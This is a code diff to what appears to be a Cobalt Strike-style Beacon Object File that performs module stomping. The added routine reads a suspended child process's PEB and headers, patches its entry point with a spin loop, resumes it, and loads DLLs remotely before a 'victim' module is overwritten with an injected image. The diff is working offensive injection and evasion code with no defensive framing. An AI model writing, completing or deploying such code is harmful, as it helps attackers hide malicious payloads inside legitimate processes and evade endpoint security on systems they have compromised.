@@ -28,11 +28,11 @@ static const char* PpfStompVictims[] = {
     NULL
 };
 
-/* Load into the child before stomping so IAT addresses are valid. */
+/* Full paths — loaded with LoadLibraryEx after the process is initialized. */
 static const char* PpfStompHostDeps[] = {
-    "msvcrt.dll",
-    "ole32.dll",
-    "OLEAUT32.dll",
+    "C:\\Windows\\System32\\msvcrt.dll",
+    "C:\\Windows\\System32\\ole32.dll",
+    "C:\\Windows\\System32\\OLEAUT32.dll",
     NULL
 };
 
@@ -575,13 +575,86 @@ done:
     return ok;
 }
 
+/*
+ * Suspended processes have not run the EXE entry point; LoadLibraryA (DllMain)
+ * often returns NULL there. Patch EP to jmp $, ResumeThread so the loader
+ * finishes init, then we can LoadLibraryEx real deps.
+ */
+static BOOL PpfStompWarmProcess(HANDLE hProcess, HANDLE hThread)
+{
+    CONTEXT ctx;
+    ULONG_PTR peb = 0;
+    ULONG_PTR imageBase = 0;
+    BYTE hdr[0x400];
+    IMAGE_DOS_HEADER* dos;
+    IMAGE_NT_HEADERS64* nt;
+    ULONG_PTR entry;
+    BYTE patch[2];
+    DWORD oldProt = 0;
+
+    if (!hProcess || !hThread) {
+        return FALSE;
+    }
+
+    MSVCRT$memset(&ctx, 0, sizeof(ctx));
+    ctx.ContextFlags = CONTEXT_FULL;
+    if (!KERNEL32$GetThreadContext(hThread, &ctx)) {
+        PpfStompFail("GetThreadContext");
+        return FALSE;
+    }
+
+    /* x64 CREATE_SUSPENDED: Rdx = PEB */
+    peb = (ULONG_PTR)ctx.Rdx;
+    if (!peb ||
+        !PpfStompRemoteRead(
+            hProcess, (LPCVOID)(peb + 0x10), &imageBase, sizeof(imageBase)) ||
+        !imageBase) {
+        PpfStompFail("PEB ImageBase");
+        return FALSE;
+    }
+
+    if (!PpfStompRemoteRead(hProcess, (LPCVOID)imageBase, hdr, sizeof(hdr))) {
+        PpfStompFail("read exe hdr");
+        return FALSE;
+    }
+    dos = (IMAGE_DOS_HEADER*)hdr;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
+        (DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > sizeof(hdr)) {
+        PpfStompFail("exe pe");
+        return FALSE;
+    }
+    nt = (IMAGE_NT_HEADERS64*)(hdr + dos->e_lfanew);
+    entry = imageBase + nt->OptionalHeader.AddressOfEntryPoint;
+
+    patch[0] = 0xEB; /* jmp $ */
+    patch[1] = 0xFE;
+    if (!KERNEL32$VirtualProtectEx(
+            hProcess, (LPVOID)entry, 2, PAGE_EXECUTE_READWRITE, &oldProt)) {
+        PpfStompFail("protect EP");
+        return FALSE;
+    }
+    if (!PpfStompRemoteWrite(hProcess, (LPVOID)entry, patch, 2)) {
+        PpfStompFail("patch EP");
+        return FALSE;
+    }
+    if (KERNEL32$ResumeThread(hThread) == (DWORD)-1) {
+        PpfStompFail("ResumeThread");
+        return FALSE;
+    }
+    /* Let ntdll finish process/thread init while primary spins. */
+    KERNEL32$Sleep(150);
+    return TRUE;
+}
+
 /* Map host deps in the child before the victim is stomped. */
 static BOOL PpfStompPreloadDeps(HANDLE hProcess)
 {
     int i;
     for (i = 0; PpfStompHostDeps[i] != NULL; i++) {
         ULONG_PTR base = 0;
-        if (!PpfStompRemoteLoadLibraryA(hProcess, PpfStompHostDeps[i], &base)) {
+        /* flags=0: resolve imports + DllMain (process must be warmed first). */
+        if (!PpfStompRemoteLoadLibraryExA(
+                hProcess, PpfStompHostDeps[i], 0, &base)) {
             BeaconPrintf(
                 CALLBACK_ERROR,
                 "[!] stomp: preload %s failed (err=%lu)",
@@ -746,6 +819,7 @@ static BOOL PpfStompResolveImports(
 
 static BOOL PpfStompHostDll(
     HANDLE hProcess,
+    HANDLE hThread,
     const char* hostDll,
     int hostDllLen,
     const char* mapName)
@@ -762,8 +836,12 @@ static BOOL PpfStompHostDll(
     WORD secIndex;
     int v;
 
-    if (!hProcess || !hostDll || hostDllLen < 0x200 || !mapName) {
+    if (!hProcess || !hThread || !hostDll || hostDllLen < 0x200 || !mapName) {
         PpfStompFail("args");
+        return FALSE;
+    }
+
+    if (!PpfStompWarmProcess(hProcess, hThread)) {
         return FALSE;
     }
 
